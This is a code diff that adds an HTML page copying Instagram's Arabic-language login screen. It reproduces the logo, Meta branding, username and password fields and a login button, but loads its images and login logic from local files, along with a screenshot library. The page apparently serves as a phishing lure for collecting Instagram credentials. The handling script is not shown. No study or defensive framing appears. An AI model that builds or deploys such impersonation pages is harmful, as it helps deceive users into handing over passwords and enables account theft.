@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Instagram</title>
+<link rel="icon" type="image/png" href="images/favicon.png">
+<link rel="apple-touch-icon" href="images/favicon.png">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="style.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+</head>
+<body>
+
+<div class="header">
+  <img class="logo" src="images/instagram.png" alt="Instagram">
+</div>
+
+<div class="main">
+  <div class="form-side">
+    <h2 class="form-title" id="formTitle">تسجيل الدخول إلى Instagram</h2>
+    <input id="user" class="field" type="text" placeholder="رقم الهاتف المحمول أو اسم المستخدم أو البريد الإلكتروني" autocomplete="username">
+    <div class="pass-wrap">
+      <input id="pass" class="field" type="password" placeholder="كلمة السر" autocomplete="current-password">
+      <span class="toggle" onclick="togglePass()" id="eyeIcon"></span>
+    </div>
+    <button class="login-btn" id="loginBtn" onclick="login()">تسجيل الدخول</button>
+    <a class="forgot" id="forgotTxt" href="https://www.instagram.com/accounts/password/reset/">هل نسيت كلمة السر؟</a>
+    <button class="fb-btn" type="button" onclick="goFacebook()">
+      <span class="fb-icon">
+        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <circle cx="12" cy="12" r="12" fill="#1877F2"/>
+          <path d="M16.671 15.469l.532-3.469h-3.328V9.749c0-.949.465-1.874 1.956-1.874h1.513V4.922s-1.374-.234-2.686-.234c-2.741 0-4.533 1.66-4.533 4.667V12H7.078v3.469h3.047v8.385a12.09 12.09 0 0 0 3.75 0v-8.385h2.796z" fill="#fff"/>
+        </svg>
+      </span>
+      <span id="fbTxt">تسجيل الدخول بحساب فيسبوك</span>
+    </button>
+    <button class="signup-btn" id="createBtn" onclick="goSignup()">إنشاء حساب جديد</button>
+    <div class="meta">
+      <span>Meta</span>
+      <svg viewBox="0 0 24 24" fill="#0866ff" xmlns="http://www.w3.org/2000/svg"><path d="M6.915 4.03c-1.968 0-3.683 1.28-4.871 3.113C.704 9.208 0 11.883 0 14.449c0 .706.07 1.369.21 1.973a6.624 6.624 0 0 0 .265.86 5.297 5.297 0 0 0 .371.761c.696 1.159 1.818 1.927 3.593 1.927 1.497 0 2.633-.671 3.965-2.444.76-1.012 1.144-1.626 2.663-4.32l.756-1.339.186-.325c.061.1.121.196.183.3l2.152 3.595c.724 1.21 1.665 2.556 2.47 3.314 1.046.987 1.992 1.22 3.06 1.22 1.075 0 1.876-.355 2.455-.843a3.743 3.743 0 0 0 .81-.973c.542-.939.861-2.127.861-3.745 0-2.72-.681-5.357-2.084-7.45-1.282-1.912-2.957-2.93-4.716-2.93-1.047 0-2.088.467-3.053 1.308-.652.57-1.257 1.29-1.82 2.05-.69-.875-1.335-1.547-1.958-2.056-1.182-.966-2.315-1.303-3.454-1.303zm10.16 2.053c1.147 0 2.188.758 2.992 1.999 1.132 1.748 1.647 4.195 1.647 6.4 0 1.548-.368 2.9-1.839 2.9-.58 0-1.027-.23-1.664-1.004-.496-.601-1.343-1.878-2.832-4.358l-.617-1.028a44.908 44.908 0 0 0-1.255-1.98c.07-.109.141-.224.211-.327 1.12-1.667 2.118-2.602 3.358-2.602zm-10.201.553c1.265 0 2.058.791 2.675 1.446.307.327.737.871 1.234 1.579l-1.02 1.566c-.757 1.163-1.882 3.017-2.837 4.338-1.191 1.649-1.81 1.817-2.486 1.817-.524 0-1.038-.237-1.383-.794-.263-.426-.464-1.13-.464-2.046 0-2.221.63-4.535 1.66-6.088.454-.687.964-1.226 1.533-1.533a2.264 2.264 0 0 1 1.088-.285z"/></svg>
+    </div>
+  </div>
+  <div class="image-side">
+    <img src="images/hero.png" alt="Instagram preview" id="heroImage">
+  </div>
+</div>
+
+<footer class="footer">
+  <div class="f-links" id="footerLinks"></div>
+  <div class="f-bottom">
+    <span>© 2026 Instagram from Meta</span>
+    <select class="lang-select" id="langSelect" onchange="changeLang(this.value)">
+      <option value="ar">العربية ▼</option>
+      <option value="en">English (US)</option>
+    </select>
+  </div>
+</footer>
+
+<div id="toast" class="toast"></div>
+
+<script src="script.js"></script>
+</body>
+</html>
